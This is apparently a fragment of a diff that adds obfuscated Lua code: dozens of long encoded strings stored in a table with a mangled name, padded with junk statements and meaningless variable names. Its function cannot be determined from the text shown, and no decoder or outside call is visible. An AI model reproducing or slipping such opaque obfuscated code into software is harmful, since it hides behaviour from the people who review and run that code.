+_lGHIJKLMNOPQRST_0oabcd[237]='/+Sg/v3k6tv86e7+svrt0fzpzr685OjM473pudjozPOy+cPR7f7nwezTvfPh+MzjztLpzOf/ztm96OrM+Nnm7u+yzNu+5ebM7N6k3ObS0du4/enj2fnSvvm9vMHO7tHE2NLvvuLpzMz9/erM2+HmxOG8zO3/5dL7vuDu7rvt5szn/c2+yuqgydrp6vPfvODJur7D0bPe58zk0rPZxN6kxKDR6fPk0urE2NG8oNrtv+Og6tLms+/RweHy6cza7+bD4/7m/cn+vOPA0bzm4/rt5u/g5cnf7M25zujMucnhv8nt4urBs9jnudjR5sHB+8y+zeC92cn77f7x+73t7f3S7tvkvOO/2Oqg+f+94+Pk78PM2um58+S/48P/v77nu8z7s9Hpwbz/zcS8+bzM'
+_lGHIJKLMNOPQRST_0oabcd[238]='4/PNybnuvdn/u7P7/tLRpPP64Nns0u3Z7+DDoLzjvszh4MzM4/LDyf/70cP82czM2+zS+77+5vvj5MPj4ezOzLPovrmz7+bR+b7g+/ro0cH/4rzZ4+LM7bz4zMzjpOrj36Dmwbz50vvi7dLJ7OjmwbLlw+PH4ufbweG+zN+85r7v7Orj+fnt47vYv+a/2OXZu9LgzPm+6sG/0eDZ/t7g/uDTzu77uOek6NK9zNn6oLng07zz6O695ujo5tvM3urR2O3MzOfyv9mz07PcyeTMoOba6dPu6eWgsvrmye/66Mzb5enBs9O95qTkzdvn5b3m8eW9+/7e0u6k+OD+xNG/7sDRssy/0unj5fu83O/g56T9+ebb/eC9uPvhvNzH+c3DuvvD5uPkzaTn/NHz'
+_lGHIJKLMNOPQRST_0oabcd[239]='pPnD89+k6szj5KTE/fuyuMf77sz/oOrMvOC85u3iw/u56eXju9HovsTR59vl+emg2uq9vtjRzPPy6qTMsvrD/uzYzMTE0rLJueruzLvp6tno2MP+4+PMoKTg5e7o6c3B+aTRoPmg6vPj+cPuxNrpoKTl7dzh8b3M2/jg2eze6u7o7enE++Duw8DuzO273urb++LM/cPl0u7z/b3t6O7l7sHk6fvf/+a5vvrtzPugw6D/4r/Ms+jpoPzvvNPh+r397f6+pNnlzKDj+ObJyf7nvvu9vOP7v+nM/O/D++X/5sP7/M7Z+7y85vv86e684b3ts+jqzPP94P7t/c7R+tPqzPzRvOb5uL/uxNLS/u+g6qDh5L3Ms+/M48niw9P80tLJ3/3pwcHkpLnnv+r9'
+_lGHIJKLMNOPQRST_0oabcd[240]='6NPqw8zqve7A6qDbvuzDuaDq6qDl5Ojj7eCg7dn60szB7M2g+eK9uaDa6sPx7Orb8+DMuMLS57nJ5Orm5/3M2+39vO7a0bzc8/npueX6oMmg3szM/NnlxOPzw8T5/cPmvvvDzLvevfP9+77M5f/OoMrZ0cPs2bzJs9Pt8/n5vdvv+MzlxNLN89n7zMnB5Orm36TS/r/qw+7//c2kuejlxMDe5rig78PJ4bjMoOPg0tz//rzcwOi84/uk6cn7+dHbzu2888Lpv9ng6syg+6DS2cHg6rn5+On+5Onp2drepNy85aD7zeDO7s7Y6sm648zMyui+wcLtvOPO6Or+w+Xvw8De6KDb/eegsuTm3PHloObf8bzJ+7i/5r/RzO2z2czboOm8ydv5ve7ju9Gk'
+do local _={42,32}end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 404 end
+_lGHIJKLMNOPQRST_0oabcd[241]='++DNue3jv7743r7M773S3Lz5zsznu9Lu7fqz4+PkoP7x+ObB/OntoLvu6dn9+qTJ2+Ppuc7tzaTg6urMvv2+w+Pk6Nn+0dLM2fjq5sf45cT7+77MyeTmw7rg7tn83urZ2Orlub7+w+bj+c25yezq87L+5dnv8eag7NPM3P7TvMzH5cPM+NHgzOHy57nvsuq58+TD5v/578H75b3Z7urq/drZzcPlu83M5N7O3NjRs8n9/ry55NPgzOfs6uOk5c7msuDn26Dt0cHz4r6k2OnDxLvfvczy79HBzu/t5s7Rzcyy+6DZ6O/lue/sw/vi0sPT7ti9uOGyzqDM0u/zoNLDyb3azuPo2uq+/N7tzKT/zMT95O6g7bi80czRstvx4MOgv9K84+De4Obo2unm'
+_lGHIJKLMNOPQRST_0oabcd[242]='wNHSzMPszNzj7M25uem989myw+PZ882gyeLquLrs6b7Z+7245/i95cnkzNy77ua+suK8oOfj5ubl++bE77LM2fv+w/PN7NL+pP/M5qT6oMOg3r3Z8/2+vuG9vdHZvr3D5/i92fu8vcPO2cOgsuDt87z+5dzY6ODZwfrpzOX40ubb+eWg4uru2cnlv8zJ4uq42/vq2e3i4O7g7ry5wf/Myf3kzMz/5dLj7/jp5sLv4Mz9++Dc+6DO/vzY6v66/b7D5tm8xMngoLna2NHD7/28+/jY6v7A2tGg+u/R29n458Pa6er7ytnNvqT55dnvvb3u7eWyucni0sn9++rzuPvq8/vy0ty96eXZ/ti+w/m85f7j/ur9uOHm287Z0syz0rLz4unS++7t5v3y6L25'
+_lGHIJKLMNOPQRST_0oabcd[243]='5O7l3MrYw/PB/b7bztLq0+3578TO78zEweXSoP++0aDM6cz95tHvuaTi6ubnvNLc+u3S/uO4v9HK7+rtzOrnwf/yzqDs6L3M4aDlzPjq6czJ+rK4+O/NyeWy0bn7/c2+2eXS/r3ZzMPs2ur9suCk4+DTw9n+2cO5vv6+uOPlvebJ5OXB4/jM/fjt0bnt5MzRweW9/eXs0cPj+s7+4//pzMP95bnx473T+OnD5u376czH+6Dc+/zRycHl7qDJ/tLZwf/D2dnk6tPj+rK+5aTOvvPkzdvk0er+++WzzOXk0v77/+agyeK/zNrq6tvx5NLm5/G8/uH/6OPK6e+k77jNw/HivMT7uO7uzunM5cPl6tnhoNG5zu/S0czS5cH55e7j2fG/48LpzNnJ5erD'
+_lGHIJKLMNOPQRST_0oabcd[244]='w+DRxPn+6u26/+b9+bLp/vzvw77/+OXZuenvub775aD82cPm4t7S5uO/vNn87+XuztPOzL7+6cTa7ubJ+/vuwcrow8T/4MzEu+jp/r/Ts/7E7czbvvnq3Pv+vLn7vMzRuvuk5rz54Nnk3unm/O7M/vHs0v755c3M5/jpxO7qoOXm7eq54NPloN/l6P7ZvODuuvPSycf/0tHloOnJwfvu/vzp7sHb+L7B4/6+uPu/6sTvpL/ZzNOzzLvuvOPA0+nu7/qkvrj4vKDh8+Dc477l09jS6tPb4r6+ue7NwaTi6rnj/83z+NOyoOG7ssPm083B77ig/cLvw6Dx4ubDurPqw+Xl6sHZ/eD+ztng48n7vf276dHJ/N7g3Pza6sPz4r7b7u3RvuTR5sT6086+'
+_lGHIJKLMNOPQRST_0oabcd[245]='/ezM2eWzvbn5ve258unD0bj9vvPv5L2g7/68xODY6sTjvM3JvuPRwbzg6tHJ+6DmzeW9ucLY0vvO07z75eS8/sHjw77Z4LzZ5Onpub3uzv7D/bzz/O2/0fjf5ePy0s3b/NPlwbrh5cHb/8z+weTuvuf7vtvx+uekyt/l3Lr96uO64r25//vl0ebTw+6++cP7udjp4+GkvMzx+824vOXvzPzR0tzy7tLjpPjmzPmyvb66+rz+2fLq/rr5w8Gz0emg2/jMw9n5vczh4b3l2N/noOPzve3ns8Pms+jqwdrp0tnO7+372O7l7sDRzqDfoOXM2u3q7e7Rsrnj+L7E+aDp3Pv7zaTz/73Jvvq/3MrTvqTk6rPMur7pzNm/6NHtu+DZ7fjD5r75zb743ujM'
+_lGHIJKLMNOPQRST_0oabcd[246]='4/uy87/azsno2Onusvm+oObtvNnD5KDZzN++yb75vaDl4OD+8+Pq/fugvdG76rKkuOG9uPzpzaTj4LP7+fjRvr7+vcHJ7M7+/+TpwfzYvbjt/c3zyeTmudvi6cmy+b3Ms9LM2fPjzOXa3+e42bi98/vlvczu7bzE4NPNuPm7vaD87+m54+DM/eO40b763urj/6TS+/LSzO7ZpL3BpPm9oO7a0aTtu76+/N/l0ezToMzk3u3ZwO3p3PrT6e775e254tO9xM7p5vvj8eXzzO7S2dvgzcTZ4Oek576kwaDvw/692dL+3/LN8/uk5dHjs9LcuuC9/r3Tv8zB4OnB+u/g/u7ZzO7A6Oe+uOW/0fzT5u3O7erm4tPOvu2y5rnx4My5+bi95fP/vrik/cPM'
+_lGHIJKLMNOPQRST_0oabcd[247]='+N/loL3q577o0sPjoO/O/vP7vNzv+b7zzNLu7v3lzdu4+7/7/6S95eTozLi4+7+g4by83Lr67sH7s7zJve3O4+36oNPf+MzEwO/nvtjTvcm+4KDt3/PMxOTt0ub/873TsvvtoMfgoP35pMPMurzmwcPkpOb/s8PJverM7rLjzu7z7OrZ/Onm5u29oP3n8r3c6OnN88ngzqCg6unJwt7RuOP+zcmz2On+2/u887j9veO56ebTve/DweW+7rjz+b3Tzf7g4/vlvf3l5cPcvuXMvrq/5sHZvefJoO29yb3qvO7vs+D+2aS80brj0v7Zv+a+yfrM2f/x5e7n8tLj7/PRpNn/v8nJ48zT7fi82cH678zD5c7Z7O3N89je6cTv5eekyurqzM7e5u3y0r/Z'
+_lGHIJKLMNOPQRST_0oabcd[248]='47vtoPrvv9zs0b257+LNzPmgw6DN+ujmwOq/3NrR7dPa6Oa4+Oru08Tq6Pvo0rO+2tLm5t+95eOy4s7Jwt7p7v7S7dPt5e77zu7g0b795cG6oNLMuuTm2fjT4O7h/+bb+fjnw+7q7v7a6b6+7NPl5tnl7u3j++XE/unv8+Tq6bnA0bLJ573RxLzg0sn5+c3zu+7SzOO86O7407zT+t7q/aT558O56ebZyfm/zPH6oPOg3uX+4ezRuNmkvNzm0+rBvejRuM3j6aDZ/r/uwt7mzM7q7vPi7ue58tG97b3e6Nzv8ebT4fnq49ro58TN+ubb8uqyuLno4OPf8tLM57jn2/v75u3Z5OagsuLg2czqvMzn8uDc5eLMw9n7vfPm0u/Bx+SgoP+70u672Lzm'
+_lGHIJKLMNOPQRST_0oabcd[249]='7Nnq7vLovNn406TjwNHuufLS0b7foL/JyeK94+ek0czb4OfEoNPMzKDfv/7v+dG4/eG+2//7vczK0+r+xN7qwbjk6bnZ/bz+uuTM4/nyvfv5/syguPnt7vrTzcmg2tLj4/nq5c357bm52L64oOnMweW4vdH7+b3E7bjOoOPl5uO6/86+s9PlueX/zOXK79Luu+/M4//i0cH+6efJ8+Pp2ezev8nD4uXB7fzNuNny6cHnoMPj36DD7u275b766OqgwePM0fLS7snf8sz+/+G+xPP+4Obvvszj7eLl87PqvsGk5bLM7+Lm88H/w/vf7M7R4bO//u/6stvk6OXEx/ro0eTR5v3M2LzE4/ru5s7p58S76uXJ2bvtzObR7rnD5dL74bzm7uHhvdPz5Obt'
+_lGHIJKLMNOPQRST_0oabcd[250]='+b+8oM345fu6+b3zytjNweDe7dy70by53+Tqvvu85dn74OnmxOnp0/v6w8Tz4s2kvPnm87L4vMng073BxOjMueTSpMG4/szc5N7M7fH96sHhpMPj2eXl0/390fPs6s77/7uk7vLYzOPJ/ebM/NHpxLq7pNPO06DEvP3D0+3j5cH74b7DpPnooPP9zsm8+OX+ztKz2f/g7u37pMPu37/DoOfs6r75487j+bzNwe/95sS6+szZyt6gycTpzaDN4s3Mur2gvu7S7ebhpL/ZudPNvtre6sP5pL3E/7LM5sf60czvv+fMurjNpLz9zu68/b3z+tm809ni577D/c3zzePg0d/67u7nuOfBwu/D0/zovf3i6cPB8eSk4+G/0b6/2un+4tnO2fHizszn4Oqg'
+while false do break end
+for _=1,2 do end
+_lGHIJKLMNOPQRST_0oabcd[251]='8f7S3OOg0r775Oag+f/M8+DvzMT637zj/tGywcruzNP82L245f+9vtn7pMnf5L7J+7+g48f+vcnK3tHD2fjg7rzszPuk487mv9Oz/vu96b66uLK4yfvp2b3f5dH46ebEzNLvuOf4ve2z2sPT/+LnpOW7vf3+0urJ+tKgxOjZw9Hj+unm+/zp0cfgvdG/7s3z5eTOvufg6tzh5KC+5bigwe7a6cz43szJ4/vvxMHlw/vs7ebD2fq9zPP+0cz/+erE7ujq5qDS6czk6eDJ5f/quNjuvb7u6e7Z+tLoye++7bnB5aD+77vMwcTezty/0aTE+tHNuN/jzdvg6dHb2t68yb/pw7nk0b7Jx+PS7sDToPvf+u2gv9jp0ejp58Tnu+jm4ui95uGyvNHlvubz'
+_lGHIJKLMNOPQRST_0oabcd[252]='+t6zybr4vdv7+eeg773MxPrtzcPy0urR5uq/oOO/5tnnvubzudjm7ezT7v7H4s7czOno4+Dpv77C77zZzOi82cLT0r75u825uOXqoOOgw9HN+ebtwu3g7vrqzr7/7M3Ds+qz+7PSv+PK0aDm4Oq+w836s6DM7r/R/7uz4+ztzLjn4uCgvuTo2e24zaD/5b3Durzq+83lvcP+3ubc4frl3O297cG85bzB5NK9ueHk0aSg7rzm4N7u8+3k7vvs7+bcvdK87s7SvNH47sPBoOrl+6Dq7ubm7uDR3/PpzL/Sw9P82szM4u/u5r3qzObx/ee+47u/7rq+pPvvuL3l+bPRzLq97czD/s7+yt6+xPnz5u3y2MPRwf7D5sPg5rnv8+nZ5NHpxPu45dPM6eXm'
+_lGHIJKLMNOPQRST_0oabcd[253]='ztHqw/n6vsH+6uXc2+Xtyfre7dznvLzmx+S97eDf5bn7uM7ZvdO9we29vOPE373t5ePq28HkvO644O7z3/rvyb/q6f7s6c2476S9vqTlv/v40b7J4aDm29jew/7m2c7u37294/rSpPP75OmgzN/l47q/ssTvuL/+8f7M3P3657jo0ubbsuPqzLPRw8T5v7/Mx+Do3KT77v3H++ig8tnNxP/g5v7C7szcytPD3KTgpKDj/9HJ++zqxNra6u7N7On++fO92+DazO35+7K5pOzSzP+4s76z6bzMsvvM7b3e4Mm687/M/73l5u/gpObC3szM/7jM7fPg7e7o37/uwNO92f/kvbnZ4KDb//qk0cDR6KDO2s7m8/vv88LZv/7Y6b2+8tnRxMf9vszZ8bz7'
+_lGHIJKLMNOPQRST_0oabcd[254]='+b/v873qoOPN4eX7+trM5uLT0tz5+eDRpODOzM3k6fvhvrP+/eHmzPjp777h/Oqguvnmybj4veb/876+6NHOyaTlvdvx4r3lue3Oye7ovf3y0bzZs9m9w8njvNH78sPm5//l7sDezMzo2OrD+b/p3Pv6sszvs7/R7+Sg487t0tHM7+Duwt7q3OLq78nH+r/M3/zpvuDv5qDJ+c774bvg2b3vvrnz4tL+/eDq2//6ve783uXu++G+pNjYw8z7+czt7/u/oObvw7644Oj737vRzO7Y0bnY7uD+yfjqzLL9vNn//b/74fm/7v/5zLny6u7cyeTR877i5r767eW+57vu28f+5v3/7MzTvP/nzPvj6ubv5eig2fG/2c7Yv+Px5ODJ//qg2fjR6NnH4LO+'
+_lGHIJKLMNOPQRST_0oabcd[255]='5Ni95u+y6uX47ubMyfqk5rLg6dztvdHzuPruye7Rzszs7rzMzfvp3ODe5szN+u3ZuPvS3KT4w7nB+ObmoNjS48zTvqTg2eXmx/u92drTvOPD4sPB5fm9zLrl6sm6/77E+unm++H/vOPY7eD+4b7OzOW76v7409Hb5fLS4+Oy4Nz46uD+zNHq/fP7vrnjoOC+4bLNvu/40szfveXu7728xNv/0cHi6b3j2/2/vuH86v2y4r37uv/m0djR0aDh+r39uqS9zLLkvf7i6e77s+/qzMDZ0tzg2NGg2eO9zL7h5u767urc/NnM8/ny6e7a0uXcvPm8we/kpMT+2urlue3nuN/jzOXg2cPZ2u/D5sfs0ubx4+XBytnp+8Tu6cm57eXZs97Nye/h5tHx5aD+'
+_lGHIJKLMNOPQRST_0oabcd[256]='ztnDzLL70bnz5b3z4t/g/ufkoPPj48y5svjMydnz6ubO0rPZ/Orq++/6v8z54tG5u+/gvrna0czJ+ebl5NjM8/m4zv7Y2eC+3/7m2fmz6dHO6ObE4+zSoLrz6uXtvrzRw//qxKDeoO296ebz7bjS3PLSzPv+3uXc5O6+we/z5aCg082gsuLnw+fiv6Dk2OrJ8eXD4/P70ub+2uq47/zDxO3j4Obt+L2+zfjp+/vyvcyk+b39uOLl5vH758z//MzR+bjq3P/50tm6uLzM7eW+28Tq59vN7NHBuuLmzP+86bmy/ubmsv7nw/jZ5tv54+DZ5Ni+wc7SzNvz4LK5zum97aTkzP374+ek+tjD88P+5tvz+Orc4OjMxNnkw8Tm0ubtuPjq/rzl0v7n4bzc'
+_lGHIJKLMNOPQRST_0oabcd[257]='wu7lwd/kvPvb7MO+/Onp06DY5r6y5KTR8+PM07j9vbi/7tLc+//g5vzYzP6k5MPz2+PDwfP6s77a2czTztrRw+Ta0cnns764/+XMxOO95rjv+r3B+t7g2fLuzfPa6cyg7trM5tv70qDvvaDJuOPNvsPlv/7E0qDb5NGk5uLo5u35/by+8frmoLL+58z7/8zB6Ort+7q86r7J487J3+O9vrL6veXvuMPM+7vM/ebt6u6537/cpP3Nvt+84Nnl8uXZyt7S48Hgvf3547++3+TD89re6cH8073Mvdrqubvo5tHh5erjweTMzMTv0cnC6b3RpOHnw/HivPPC2b394/no7vLp7uW77+3cwNLnydjS58TY6u/JzeK80/jp7sT86s3DvOHludjT56DK6L3M'
+_lGHIJKLMNOPQRST_0oabcd[258]='7/vO3Lzg5rjJ5ObT4/np/vzevsS8+b655//m08n+4P676ur72eXm2eTY6v3a06T7svugvrvS6sHB47+g/+C80c7uzMm+/rzZ5eK/3Nnl5aDH/s3z/f2/5u7Z6tn5/s7cx+Dq7fLRsqTC6MPZ3+Tp3PzT7dzts8PZ/eS8wcHl0qDN4r3j5urnufjo5fvY3sP7+unD48HlvLnY7+2gwO7qubL9vsz7/ubtuvru7vP+vO7+077z8/i8oO3lvrnJ5O7M+N+/0e3jvrm84Omg5eDvzMTa6sy4/r+gv9Pq0cfi0u7o3uq4+f7M09+k4Mzu2tLMx+Xg5s7vw/P66e2+pOW/3P/4v8y72dL++aC85qDpvNPE0dHbwu7q/ef7s9Hy3qDbzeDMzKDv5vPy7sz+'
+_lGHIJKLMNOPQRST_0oabcd[259]='suDm/sLe5vvK6b3m/eLDxL/Rvebl/szz/+LmyeW+zLi/7+nB77i9ucn7w9G8+ODmu9HmoLPq5/Ok+8y+8/q/2d/50tn74b/m/tPD477lvPPo2Orb/NKk7uDS6dH9+Mz9v9O8xOzuzNPH+8z97tPu7vvy6vPh7Oq5vPvpzMDuv9Hy78O+5/jM5eTT0tnK77/J/7uk3Mrp6tnm6rzMwf2/zNrR6cTnuObT+OjNuOTTvr7a0r/+vP/pwcf7s8y/3tHz7//qzPLT6bnN4OXc7+DgvuW4vaDH5czB4tng4+bSzLm70uqgztKzvs3lvebN+czt7NG+vvn+zbi96efzv9LMueH66bnZoM25/73qxL7ivcP+6en+pPrNpMP55snjpNLMvdOg/r/SoMyz6r/M'
+_lGHIJKLMNOPQRST_0oabcd[260]='4+S/2dju6sS8/bzT/eK95crpvfPt4szj2t7g2f7e7dm64ee42+Dq3L3v6r7y7bzR+7zmufH45tHA7+3M5eG97rvq5b7t+tLJwu/g2drtzNnA7tL7/urpyfvkzNnn/9L+7bzD5uH9w7m+/eW54ujO0bL46bnz/enJ8+TMoOzeoO7l++rZ++PD2b/u6bnb4unM4tHvuP3jzLnl/MPB4O3p5vLezMzt+cOg7b7M4//goLm90+bz3/3M89ng0vvhvqTE7ujS2b776Ob5vrPmzfjO2b3vv8zZ4ODc+bzN27j+vf3478Og8+Tm7fzvzcPlsuegzN7qoNm+s+PY0bLb+fvp++Hk58P9/enT+eO8xLrk4Mzu77/u4/zp7qT/5sn5s+rc2t7RoLrzvfvfuO7R'
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=72 end
+do local _={17,34}end
+repeat until true
+_lGHIJKLMNOPQRST_0oabcd[261]='s9LpybL5vKC65enR2frn87777dH58ubj47PmuNjt56C6v+7D5ePMvtrS6dHm79G+4tHg2eDpv+64+OXu7tPm3Nv46tPg7urjue7N2+Te5tvvuOruvvnmyebovdGz6cPTuuDt48LSw/vC3uXT/+DtzMzvzObf+eDM4/zNw8fh57i85KDDw+XmwcHgw8zh/c3B/73lzPrvv9nh/tLc/NHm7d++6u24+qTMs+nquezTzdvH+urB+7zDyfH50fPM0cO5//3lucDeoMHi0e7+vuLM0/n658P67+3jx+Tg5v7azP7l+b3l7bPDyfzZzKDl/s2+svm9w+H55ePu2OWgzf3qxLj/vczb48Og3+S/0dvi5v3O0eXB7eG8yeXlzLj+3+bj473Rubr/w7nZ8tHB'
+_lGHIJKLMNOPQRST_0oabcd[262]='47/u/uLt5szv/eru8+XnydjozP3Y0+nc3+PDxLPTw/vs6s25zurvw7j67f7m6b64suXvpNvgvL6y/eCg5/2/0bPS6tvg0s7j++K9xPmz6tHB+ebB4Oq8vsDpzcng0czc7/i/yfHk7sHloMz+zuq92crRssnN4efDuOzD8/ja0vvv/7/jztjq3O+/0u767+/D7/vRuczu6sPZvsy+7eLmwe++6cnt+e7R2aTquLvtzO7o0dGkvPvOzN/szNHK3uXm2ujNxLPo6fO64Mz++f3p7uP/4NzM77zu5f/t0eTp4PvH4+e4/eLO5u7f4MnE3rLM/77v88nlsqC8/+Du2bLRyeXl6u3N5bPZyuqkvqDZv9HnuL/J/tHRwe7o6v7b+73R2ui+xOXg6szs08O5'
+_lGHIJKLMNOPQRST_0oabcd[263]='+bzNybnt6tH+2enRw//p+/m+zMHtvr/RyeS+weTZzMTlv+rD4tK8oNjYv8mk++7E2eDu0+ey5tHhpMzTur+8vs7e5tG96rPu4fvDwfm+v+bJ+erm/N7g2eP/vsGz2eXJ2NKkycn/zaDN++DRpPnOzLr60cG737/c8tPSzMPk5tHg6L3Z2Oq8vvzT6sPn4737+N7q/qT5vNzhv+XzzeSkzOG+v+bo6NKg4fLp88355sPA2uru8urqxP7Zvdvl/b7M/O6/zOG+6u37uLzT3/Lm5s7ow+P+0+XZwujRzOGgw77H+ODZ2f7DweH+vMTD+e3c//3m2+zu6dn//eX+zu3NxPrRw7nx5M7Z5fG/zKDToMz9+r3luerNoObo5dHg3uag4NLpxOHiv9m76um5'
+_lGHIJKLMNOPQRST_0oabcd[264]='wO7qxM7tvdPH5KTZ4aTmweXizfP82L3tx/+/oPPkztnu6u3u4bzM0ebv7aDY0szj+tLRzLjj6sni6e25zu7qw8re5/O72sy++fLNzMn5w77x5dHbwfq95r74zsn5/c2kpOXtoPPj0tng7enmzO7l2drp6Nmg0c7m7tLm/cDvzv75ssPE/Om887/SzNzu7cy5zujS7vjqoOPh4r7Budjl873YztG6v73Zs+7pxPrvw9z7u7/Zyezq5fze6ePv5Orbwf3qzOe/vf7K0cPjvOzS7rvTzbnB5L3l4NKk46Tj6cnb+8PzuuDpxNjo6tPH+ObZ+OrmzNn+vcnz5aDmpP/M2c7Y6r7H+82+vPvOzKT4w/7l8szB/NLq5fH+vsPJ+tHzs+7NzMPk7vvn+OXM'
+_lGHIJKLMNOPQRST_0oabcd[265]='46S//r740u7a377Es969wcn7vrj608O+wePD5uP+vMnv+OX7yf6+uOG+pP747b++uv/m5cf66uX+772+urjqoPzpw9G++rzcxNm/2fvjv77O07zB4u/S7vHszaTf/7z++Onp2fzRzPu+7MO55/K9zO24w8zlv+n7/tLD2ezt6aDZ4eXJ7buz47rx5szj4+nE76TRoKT66tnk2enR6Orq/tja0uOy+urbuvm9vsnk6NG56b7Dv+7NoP/i5e7f4L6+svi9vvvg78Tj4ufJwu/v873Rv77m6eqgpPrl877lzObs0urJ37jq/szY6eb62bzMuP/M8/ro5ePM3rzu+/i/5sLTzNn7v+DmpOzq/eXkzNuz0aD7+fnquePjzNvtu8zBpPng/r3Z577D5O6g'
+_lGHIJKLMNOPQRST_0oabcd[266]='4tjRzP7T77m6/b3u5u3D5ujRzb6/6OfM7/7gvrq+7fP/v+2+wO/D+7jjzNnD+77z8eLM5u3gpObk7+njwtPoyc7fvcnt5e7j7b3qud/zzPvtv+Dj4urRpKDvvsHM2Mzu8+Tu2+24vcHK6ebMzeO+zLzk6b7v++7DvODu7vH7v8zt+sPM//PDvuTTpNzvpNHb5NjDye275r7z+qDt2eDvvv3/7cnh4+nc/NPovrvt5szz5Oag+Ni807rg77js0bLb2/3g/uH6zv7i2cy5v96z49jv5dPj+u6+2bvtvvm/zcTH4L3RzeSy8+P5ve7C3uD7yfqgyee97fvB+OnT5N7q473Z6rj/uObBue7mwfn57r7A6MOg3/K8udnsw7n5+6DRvvjM2+bR0sz54L/Z'
+_lGHIJKLMNOPQRST_0oabcd[267]='5fPM2fP/7v3h++7D4eXS7sH/5v253rzm7/jM8/Pgsrjjs73ms9rD2dn8w+bfv73B77/m/uzezO3Z/9HMvv/v2/ju4PvZvsPE/t6/3LL76rjfv6C42u2+oO/koNzK6eq57fug0/n/7ePk7+rZ/ePl3N++pLnt+OD+5bO946T7vcm/3uDM5NGg29n77czz5cPJ/NnD5tn/zczK2tHJ2Om/0fH+6rj/+bzJvv3moN/5zv66u9LMx/7Svrr8w9H7oMz94tPt++H9w9G72M2ku9nm7vzR0v7jsubD5eDSzLrh5ub5s+bMyfi+29rf5u3h5Or++//toPH7w8G85cPM2Ni+2/37vMnb+Mz77+C95e/j5qD47b7Bzfi/4/P/5b68+8Pj4/zMoMn45ubJ4+rR'
+_lGHIJKLMNOPQRST_0oabcd[268]='+6C/7v/ivb75/r255ujS3ODo59vlvODu/73lzOTe6dzN+qDZur7u2bL678zD+L/ZpP/t++jvzMy76NLJwNLOvufks9nN+OrE/eXMyeW+oMH95MPm/u/p+9/+4Nzvu+C+/7zm7fukv+Pz++bz/73u0cTq0cHz5O/D7u/q8+TZ6dy97erbpOXmwc3k0bny2L6+wNnpweGkvczY6r/juOLl/vrR6sTm0u2gytrD3Mngs9nZ5c3zzui9uNvj56DK0ue5+b2gueztvr7s6L3u3+S/7v3k0cHo6M7uwOnNxP+4vcS++ubT4/nR27PS4O677cPj/tK+2+Tes+PY0+/D7N+9/fLT6sGy4LLBx/rp88n4zNPg7unc+fnS3L7kvqTnv+Xm+u/qybj+zvvs6ebl'
+_lGHIJKLMNOPQRST_0oabcd[269]='xNm+pLvp577B4tHbvdHM/c7ezcn5vOXz2f/O3Prow6Dn5eXT//PM46Dpvcy56b3E5tLu5fm/6dnC07PMv+7qoP/k7rnv+e6guPntxMLZztH6783BuP/q/f+/4Nzx+87c3//q+77678z87+fB4tO+vvzqzaDA0+DZ2fPgoOW/4Mnj+M3E2/q93Pu/vO7jvubb77LDyfLt6ePZ8uC+/tGyxNrew+7u7+Xu5OrD09m/5e7b5KS+suTm07vR5fvy6M255ePq++Hz59vD/b7J4tHM7fnyvL7D/r3cyurSoOGkvvPg3urcwuqgvubu5tyg2sPBwu7O+9m/5dP5+eXZpP7p7r/eoMPb+u3B6NnqzP7T77767+7cwN7n88zp0dvb5LP+/tHM3O+9vrn74Onu'
+_lGHIJKLMNOPQRST_0oabcd[270]='5frnpO3izP3N5erM5+Ck3Pnhv9nh8+b+vOLD7tm/vbnJ/c6+8ui+2+3h56Ts2LzT+7zp2fLp5v3m3+bRve7l0+zeoLj7887mztO9oL/q7ebfvuXRw/3NvtrS57n/8rzM4bPO7v+/6aD5ss3Jx/nDxPv77qC4+7zcztPu+87v5uPlss3zv+rg3PnhvsO8/ebT2//nuL3q5vPB4+bjsvrt7t/yvObj5bLB8tHloOfgzMTD4+Xm3//nw/P9vfv+6r6k5O3NubL96bng3r3BwN/gzOPyzsz+2sPZ5urq/c3+0dvs6u3BuPjS7v7R5v273rzJ++S97uDT5v3J+b7D5tHOvuzp5cTJ5Mzt2tjg0b/S76TY79G+/u3Nyfm77r77pOqg4bzloP++6O77venJ'
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=709 end
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=43 end
+do local _={90,90}end
+do local _={74,65}end
+_lGHIJKLMNOPQRST_0oabcd[271]='zfrNw8zR5tnx/8O+w/3SvsDZ5szA6MPE+bK/vuDuzcHC06DE5NPp3Nv50biy4ObB+/vl0f/4vPv78tK+u9m/7u/kve3+6M2g5bPS/u7Z0u6/6rPMuuzM2fuk0bn+3szM5um//rPR0sn+0ebtzf3NvrneoMnJ/ue+yeXM0e7R6u7o3szb7//vwcztvrn7/enM/eXo2cPs0dv40rKkx+PqoNnl7e7i3uX7+u3p3OXy6dHm0dKg/+DSzLj56Puk+87uv+/q5t/gzP7tuOjZ4+PmoMrS5tP/++7b7u/u27z+0u7C6e/D5fzS0djp5rn80+m+venp/uTq76Db+u3T5//nwcra6sHk2On+2+K/47jjzNz/ss3J77i94+Lq0v7+6M7M7+Doyb776rjN4KDZ'
